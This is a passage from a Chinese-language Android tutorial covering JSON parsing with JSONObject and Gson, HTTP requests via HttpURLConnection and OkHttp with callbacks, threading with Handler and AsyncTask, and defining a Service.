<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">parseJSONWithJSONObject</span><span class="params">(String jsonData)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">try</span> &#123;</span><br><span class="line">        <span class="comment">// 读入JSON数组字符串 新建JSONArray对象</span></span><br><span class="line">        JSONArray jsonArray = <span class="keyword">new</span> JSONArray(jsonData);</span><br><span class="line">        <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; jsonArray.length(); i++) &#123;</span><br><span class="line">            <span class="comment">// 得到json对象</span></span><br><span class="line">            JSONObject jsonObject = jsonArray.getJSONObject(i);</span><br><span class="line">            <span class="comment">// 获得对应数据</span></span><br><span class="line">            String id = jsonObject.getString(<span class="string">&quot;id&quot;</span>);</span><br><span class="line">            String name = jsonObject.getString(<span class="string">&quot;name&quot;</span>);</span><br><span class="line">            String version = jsonObject.getString(<span class="string">&quot;version&quot;</span>);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;id is &quot;</span> + id);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;name is &quot;</span> + name);</span><br><span class="line">            Log.d(<span class="string">&quot;MainActivity&quot;</span>, <span class="string">&quot;version is &quot;</span> + version);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">        e.printStackTrace();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h4 id="使用Gson">使用Gson<a class="header-anchor" href="#使用Gson"> ¶ </a></h4>
<h5 id="添加依赖-2">添加依赖<a class="header-anchor" href="#添加依赖-2"> ¶ </a></h5>
<p>编辑<code>app/build.gradle</code>文件，在<code>dependencies</code>闭包中添加</p>
<figure class="highlight gradle"><table><tr><td class="code"><pre><span class="line"><span class="keyword">compile</span> <span class="string">&#x27;com.google.code.gson:gson:2.8.5&#x27;</span></span><br></pre></td></tr></table></figure>
<h5 id="使用-3">使用<a class="header-anchor" href="#使用-3"> ¶ </a></h5>
<h6 id="Builder设置Gson属性">Builder设置Gson属性<a class="header-anchor" href="#Builder设置Gson属性"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gson gson = <span class="keyword">new</span> GsonBuilder()</span><br><span class="line">    .serializeNulls()	<span class="comment">// 允许导出null</span></span><br><span class="line">    .setPrettyPrinting()	<span class="comment">// 格式化s</span></span><br><span class="line">    .setDateFormat(<span class="string">&quot;yyyy-MM-dd&quot;</span>)	<span class="comment">// 设置日期输出格式</span></span><br><span class="line">    .create();	<span class="comment">// 生成配置好的Gson对象</span></span><br></pre></td></tr></table></figure>
<h6 id="对象转json字符串">对象转json字符串<a class="header-anchor" href="#对象转json字符串"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">String jsonStr = gson.toJson(Object);</span><br></pre></td></tr></table></figure>
<h6 id="字符串直接解析对象">字符串直接解析对象<a class="header-anchor" href="#字符串直接解析对象"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">jsonData = <span class="string">&quot;&quot;</span><span class="string">&quot;&#123;&quot;</span>name<span class="string">&quot;:&quot;</span>Tom<span class="string">&quot;,&quot;</span>age<span class="string">&quot;:20&#125;&quot;</span><span class="string">&quot;&quot;</span></span><br><span class="line"><span class="comment">////////////////</span></span><br><span class="line">Gson gson = <span class="keyword">new</span> Gson();</span><br><span class="line">Person person = gson.fromJson(jsonData, Person.class);</span><br></pre></td></tr></table></figure>
<h6 id="Json字符串为对象数组">Json字符串为对象数组<a class="header-anchor" href="#Json字符串为对象数组"> ¶ </a></h6>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">List&lt;Person&gt; people = gson.fromJson(jsonData, <span class="keyword">new</span> TypeToken&lt;List&lt;Person&gt;&gt;() &#123;&#125;.getType());</span><br></pre></td></tr></table></figure>
<h3 id="网络编程实践">网络编程实践<a class="header-anchor" href="#网络编程实践"> ¶ </a></h3>
<p>定义一个Http工具类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</span><br><span class="line">    <span class="comment">// 发送Http GET请求</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">sendHttpRequest</span><span class="params">(String address)</span> </span>&#123;</span><br><span class="line">        HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            URL url = <span class="keyword">new</span> URL(address);</span><br><span class="line"></span><br><span class="line">            connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">            connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">            connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">            connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">            connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">            InputStream in = connection.getInputStream();</span><br><span class="line">            BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(in));</span><br><span class="line">            StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">            String line;</span><br><span class="line">            <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                response.append(line);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> response.toString();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span> e.getMessage();</span><br><span class="line">        &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">            <span class="keyword">if</span> (connection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                connection.disconnect();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * 封装好的post请求</span></span><br><span class="line"><span class="comment">     *</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> uri        url</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@param</span> parameters 请求参数</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> post请求</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> String <span class="title">sendPost</span><span class="params">(String uri, Map&lt;String, String&gt; parameters)</span> </span>&#123;</span><br><span class="line">        StringBuffer postUrlSB = <span class="keyword">new</span> StringBuffer(serverUrl + uri);</span><br><span class="line">        <span class="keyword">if</span> (parameters != <span class="keyword">null</span>) &#123;</span><br><span class="line">            postUrlSB.append(<span class="string">&quot;?&quot;</span>);</span><br><span class="line">            Set&lt;Map.Entry&lt;String, String&gt;&gt; entries = parameters.entrySet();</span><br><span class="line">            <span class="keyword">int</span> count = <span class="number">1</span>;</span><br><span class="line">            <span class="keyword">int</span> size = parameters.size();</span><br><span class="line">            <span class="keyword">for</span> (Map.Entry&lt;String, String&gt; entry : entries) &#123;</span><br><span class="line">                String key = entry.getKey();</span><br><span class="line">                String value = entry.getValue();</span><br><span class="line">                <span class="keyword">if</span> (count++ &lt; size) &#123;</span><br><span class="line">                    postUrlSB.append(key).append(<span class="string">&quot;=&quot;</span>).append(value).append(<span class="string">&quot;&amp;&quot;</span>);</span><br><span class="line">                &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">                    postUrlSB.append(key).append(<span class="string">&quot;=&quot;</span>).append(value);</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        String postUrl = postUrlSB.toString();</span><br><span class="line">        URL url = <span class="keyword">null</span>;</span><br><span class="line">        HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">        String meg = <span class="keyword">null</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            url = <span class="keyword">new</span> URL(postUrl);</span><br><span class="line">            connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">            connection.setRequestMethod(<span class="string">&quot;POST&quot;</span>);</span><br><span class="line">            connection.setRequestProperty(<span class="string">&quot;Content-type&quot;</span>, <span class="string">&quot;text/plain;charset=UTF-8&quot;</span>);</span><br><span class="line">            InputStream is = connection.getInputStream();</span><br><span class="line">            BufferedReader br = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader(is));</span><br><span class="line">            meg = br.readLine();</span><br><span class="line">            br.close();</span><br><span class="line">            is.close();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> meg;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>开启子线程来接收返回值</p>
<h4 id="Java回调机制">Java回调机制<a class="header-anchor" href="#Java回调机制"> ¶ </a></h4>
<h5 id="1-定义一个HttpCallbackListener接口">1. 定义一个HttpCallbackListener接口<a class="header-anchor" href="#1-定义一个HttpCallbackListener接口"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">interface</span> <span class="title">HttpCallbackListener</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onFinish</span><span class="params">(String response)</span></span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">onError</span><span class="params">(Exception e)</span></span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>onFinish() 方法表示当服务器成功响应我们请求的时候调用：onFinish() 方法中的参数代表着服务器返回的数据。</li>
<li>onError() 表示当进行网络操作出现错误的时候调用：onError() 方法中的参数记录着错误的详细信息。</li>
</ul>
<h5 id="2-修改原HttpUtil类">2.修改原HttpUtil类<a class="header-anchor" href="#2-修改原HttpUtil类"> ¶ </a></h5>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendHttpRequest</span><span class="params">(<span class="keyword">final</span> String address, <span class="keyword">final</span></span></span></span><br><span class="line"><span class="params"><span class="function">        HttpCallbackListener listener)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">            <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                HttpURLConnection connection = <span class="keyword">null</span>;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    URL url = <span class="keyword">new</span> URL(address);</span><br><span class="line">                    connection = (HttpURLConnection) url.openConnection();</span><br><span class="line">                    connection.setRequestMethod(<span class="string">&quot;GET&quot;</span>);</span><br><span class="line">                    connection.setConnectTimeout(<span class="number">8000</span>);</span><br><span class="line">                    connection.setReadTimeout(<span class="number">8000</span>);</span><br><span class="line">                    connection.setDoInput(<span class="keyword">true</span>);</span><br><span class="line">                    connection.setDoOutput(<span class="keyword">true</span>);</span><br><span class="line">                    InputStream in = connection.getInputStream();</span><br><span class="line">                    BufferedReader reader = <span class="keyword">new</span> BufferedReader(<span class="keyword">new</span> InputStreamReader</span><br><span class="line">                       (in));</span><br><span class="line">                    StringBuilder response = <span class="keyword">new</span> StringBuilder();</span><br><span class="line">                    String line;</span><br><span class="line">                    <span class="keyword">while</span> ((line = reader.readLine()) != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        response.append(line);</span><br><span class="line">                    &#125;</span><br><span class="line">                    <span class="keyword">if</span> (listener != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 回调onFinish()方法</span></span><br><span class="line">                        listener.onFinish(response.toString());</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line"></span><br><span class="line">                    <span class="keyword">if</span> (listener != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        <span class="comment">// 回调onError()方法</span></span><br><span class="line">                        listener.onError(e);</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125; <span class="keyword">finally</span> &#123;</span><br><span class="line">                    <span class="keyword">if</span> (connection != <span class="keyword">null</span>) &#123;</span><br><span class="line">                        connection.disconnect();</span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;).start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们首先给sendHttpRequest() 方法添加了一个HttpCallbackListener 参数</p>
<p>并在方法的内部开启了一个子线程，然后在子线程里去执行具体的网络操作。</p>
<p>子线程中是无法通过return语句来返回数据的，因此这里我们将服务器响应的数据传入了HttpCallbackListener的onFinish() 方法中，如果出现了异常就将异常原因传入到onError() 方法中。<br>
现在sendHttpRequest() 方法接收两个参数了，因此我们在调用它的时候还需要将HttpCallbackListener的实例传入</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpUtil.sendHttpRequest(address, <span class="keyword">new</span> HttpCallbackListener() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFinish</span><span class="params">(String response)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 在这里根据返回内容执行具体的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onError</span><span class="params">(Exception e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 在这里对异常情况进行处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h4 id="使用OkHttp-2">使用OkHttp<a class="header-anchor" href="#使用OkHttp-2"> ¶ </a></h4>
<p>使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">HttpUtil</span> </span>&#123;</span><br><span class="line">    ...</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">sendOkHttpRequest</span><span class="params">(String address, okhttp3.Callback callback)</span> </span>&#123;</span><br><span class="line">        OkHttpClient client = <span class="keyword">new</span> OkHttpClient();</span><br><span class="line">        Request request = <span class="keyword">new</span> Request.Builder()</span><br><span class="line">                .url(address)</span><br><span class="line">                .build();</span><br><span class="line">        client.newCall(request).enqueue(callback);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>okhttp3.Callback ：是OkHttp库中自带的一个回调接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">HttpUtil.sendOkHttpRequest(<span class="string">&quot;http://www.baidu.com&quot;</span>, <span class="keyword">new</span> okhttp3.Callback() &#123;</span><br><span class="line"><span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onResponse</span><span class="params">(Call call, Response response)</span> <span class="keyword">throws</span> IOException </span>&#123;</span><br><span class="line">        <span class="comment">// 得到服务器返回的具体内容</span></span><br><span class="line">        String responseData = response.body().string();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onFailure</span><span class="params">(Call call, IOException e)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 在这里对异常情况进行处理</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure>
<h2 id="Service服务">Service服务<a class="header-anchor" href="#Service服务"> ¶ </a></h2>
<p>服务（Service）是Android中实现程序后台运行的解决方案，它非常适合去执行那些不需要和用户交互而且还要求长期运行的任务</p>
<h3 id="Android多线程">Android多线程<a class="header-anchor" href="#Android多线程"> ¶ </a></h3>
<ol>
<li>
<p>继承Thread类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">extends</span> <span class="title">Thread</span> </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line"><span class="keyword">new</span> MyThread().start();</span><br></pre></td></tr></table></figure>
</li>
<li>
<p>实现Runnable接口</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">MyThread</span> <span class="keyword">implements</span> <span class="title">Runnable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 调用</span></span><br><span class="line">MyThread myThread = <span class="keyword">new</span> MyThread();</span><br><span class="line"><span class="keyword">new</span> Thread(myThread).start();</span><br></pre></td></tr></table></figure>
<p>或者匿名内部类</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 处理具体的逻辑</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;).start();</span><br></pre></td></tr></table></figure>
</li>
</ol>
<h4 id="异步消息更新UI">异步消息更新UI<a class="header-anchor" href="#异步消息更新UI"> ¶ </a></h4>
<p>定义一个Handler对象，然后实现<code>handleMessage()</code>方法来实现消息接收后更新UI；同时定义Message对象，通过<code>handler.sendMessage()</code>来将消息发soon给给handler进行处理</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MainActivity</span> <span class="keyword">extends</span> <span class="title">AppCompatActivity</span> <span class="keyword">implements</span> <span class="title">View</span>.<span class="title">OnClickListener</span> </span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> UPDATE_TEXT = <span class="number">1</span>;</span><br><span class="line">    <span class="keyword">private</span> TextView text;</span><br><span class="line">    <span class="keyword">private</span> Handler handler = <span class="keyword">new</span> Handler() &#123;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">handleMessage</span><span class="params">(Message msg)</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">            <span class="keyword">switch</span> (msg.what) &#123;</span><br><span class="line">                <span class="keyword">case</span> UPDATE_TEXT:</span><br><span class="line">                    <span class="comment">// 在这里可以进行UI操作</span></span><br><span class="line">                    text.setText(<span class="string">&quot;Nice to meet you&quot;</span>);</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                <span class="keyword">default</span>:</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    ...</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onClick</span><span class="params">(View v)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">switch</span> (v.getId()) &#123;</span><br><span class="line">            <span class="keyword">case</span> R.id.change_text:</span><br><span class="line">                <span class="keyword">new</span> Thread(<span class="keyword">new</span> Runnable() &#123;</span><br><span class="line">                    <span class="meta">@Override</span></span><br><span class="line">                    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">run</span><span class="params">()</span> </span>&#123;</span><br><span class="line">                        Message message = <span class="keyword">new</span> Message();</span><br><span class="line">                        message.what = UPDATE_TEXT;</span><br><span class="line"></span><br><span class="line">                        handler.sendMessage(message); <span class="comment">// 将Message对象发送出去</span></span><br><span class="line">                    &#125;</span><br><span class="line">                &#125;).start();</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">default</span>:</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h5 id="异步消息处理机制">异步消息处理机制<a class="header-anchor" href="#异步消息处理机制"> ¶ </a></h5>
<ol>
<li>Message<br>
Message是在线程之间传递的消息，它可以在内部携带少量的信息，用于在不同线程之间交换数据。上一小节中我们使用到了Message的what字段，除此之外还可以使用arg1 和arg2字段来携带一些整型数据，使用obj 字段携带一个Object 对象。</li>
<li>Handler<br>
Handler顾名思义也就是处理者的意思，它主要是用于发送和处理消息的。发送消息一般是使用Handler的<code>sendMessage()</code> 方法，而发出的消息经过一系列地辗转处理后，最终会传递到Handler的<code>handleMessage()</code> 方法中。</li>
<li>MessageQueue<br>
MessageQueue是消息队列的意思，它主要用于存放所有通过Handler发送的消息。这部分消息会一直存在于消息队列中，等待被处理。每个线程中只会有一个MessageQueue对象。</li>
<li>Looper<br>
Looper是每个线程中的MessageQueue的管家，调用Looper的loop() 方法后，就会进入到一个无限循环当中，然后每当发现MessageQueue中存在一条消息，就会将它取出，并传递到Handler的handleMessage() 方法中。每个线程中也只会有一个Looper 对象。</li>
</ol>
<h4 id="使用AsyncTask类">使用AsyncTask类<a class="header-anchor" href="#使用AsyncTask类"> ¶ </a></h4>
<p>AsyncTask是一个抽象类，要创建一个子类去继承它。</p>
<p>在继承时我们可以为AsyncTask类指定3个泛型参数，这3个参数的用途如下。</p>
<ul>
<li>Params 。在执行AsyncTask时需要传入的参数，可用于在后台任务中使用。</li>
<li>Progress 。后台任务执行时，如果需要在界面上显示当前的进度，则使用这里指定的泛型作为进度单位。</li>
<li>Result 。当任务执行完毕后，如果需要对结果进行返回，则使用这里指定的泛型作为返回值类型</li>
</ul>
<p>重写方法</p>
<ol>
<li>
<p><code>onPreExecute()</code><br>
这个方法会<strong>在后台任务开始执行之前调用</strong>，用于进行一些界面上的初始化操作，比如显示一个进度条对话框等。</p>
</li>
<li>
<p><code>doInBackground(Params...)</code><br>
这个方法中的所有代码都会在子线程中运行，我们应该<strong>在这里去处理所有的耗时任务</strong>。任务一旦完成就可以通过return 语句来将任务的执行结果返回，如果AsyncTask的第三个泛型参数指定的是Void ，就可以不返回任务执行结果。注意，在这个方法中是不可以进行UI操作的，如果需要更新UI元素，比如说反馈当前任务的执行进度，可以调用<code>publishProgress (Progress...) </code>方法来完成。</p>
</li>
<li>
<p><code>onProgressUpdate(Progress...)</code><br>
当在后台任务中调用了<code>publishProgress(Progress...)</code> 方法后，<code>onProgressUpdate (Progress...)</code> 方法就会很快被调用，该方法中携带的参数就是在后台任务中传递过来的。<strong>在这个方法中可以对UI进行操作</strong>，利用参数中的数值就可以对界面元素进行相应的更新。</p>
</li>
<li>
<p><code>onPostExecute(Result)</code><br>
当后台任务<strong>执行完毕并通过return 语句进行返回时</strong>，这个方法就很快会被调用。返回的数据会作为参数传递到此方法中，可以利用返回的数据来进行一些UI操作，比如说提醒任务执行的结果，以及关闭掉进度条对话框等</p>
</li>
</ol>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">DownloadTask</span> <span class="keyword">extends</span> <span class="title">AsyncTask</span>&lt;<span class="title">Void</span>, <span class="title">Integer</span>, <span class="title">Boolean</span>&gt; </span>&#123;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPreExecute</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        progressDialog.show(); <span class="comment">// 显示进度对话框</span></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> Boolean <span class="title">doInBackground</span><span class="params">(Void... params)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="keyword">while</span> (<span class="keyword">true</span>) &#123;</span><br><span class="line">                <span class="keyword">int</span> downloadPercent = doDownload(); <span class="comment">// 这是一个虚构的方法</span></span><br><span class="line">                publishProgress(downloadPercent);</span><br><span class="line">                <span class="keyword">if</span> (downloadPercent &gt;= <span class="number">100</span>) &#123;</span><br><span class="line">                    <span class="keyword">break</span>;</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">true</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onProgressUpdate</span><span class="params">(Integer... values)</span> </span>&#123;</span><br><span class="line">        <span class="comment">// 在这里更新下载进度</span></span><br><span class="line">        progressDialog.setMessage(<span class="string">&quot;Downloaded &quot;</span> + values[<span class="number">0</span>] + <span class="string">&quot;%&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">onPostExecute</span><span class="params">(Boolean result)</span> </span>&#123;</span><br><span class="line">        progressDialog.dismiss(); <span class="comment">// 关闭进度对话框</span></span><br><span class="line">        <span class="comment">// 在这里提示下载结果</span></span><br><span class="line">        <span class="keyword">if</span> (result) &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot;Download succeeded&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            Toast.makeText(context, <span class="string">&quot; Download failed&quot;</span>, Toast.LENGTH_SHORT).show();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<h3 id="Service服务-2">Service服务<a class="header-anchor" href="#Service服务-2"> ¶ </a></h3>
<h4 id="定义一个服务">定义一个服务<a class="header-anchor" href="#定义一个服务"> ¶ </a></h4>
<p>右击新建New→Service→Service；将服务命名为MyService，Exported 属性表示是否允许除了当前程序之外的其他程序访问这个服务，Enabled 属性表示是否启用这个服务。将两个属性都勾中，点击Finish完成创建。</p>
<p>AndroidManifest.xml的application节点内已自动生成Service的声明</p>
<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">service</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:name</span>=<span class="string">&quot;.MyService&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:enabled</span>=<span class="string">&quot;true&quot;</span></span></span><br><span class="line"><span class="tag">            <span class="attr">android:exported</span>=<span class="string">&quot;true&quot;</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">service</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>可添加<code>android:process</code>属性来指定服务创建新进程，示例值：<code>:myservice</code>；则新进程名则为<code>[packagename]:myservice</code></p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">MyService</span> <span class="keyword">extends</span> <span class="title">Service</span> </span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">MyService</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> IBinder <span class="title">onBind</span><span class="params">(Intent intent)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> UnsupportedOperationException(<span class="string">&quot;Not yet implemented&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">onCreate</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">super</span>.onCreate();</span><br><span class="line">        Log.d(<span class="string">&quot;MyService&quot;</span>, <span class="string">&quot;onCreate executed&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="meta">@Override</span></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">onStartCommand</span><span class="params">(Intent intent, <span class="keyword">int</span> flags, <span class="keyword">int</span> 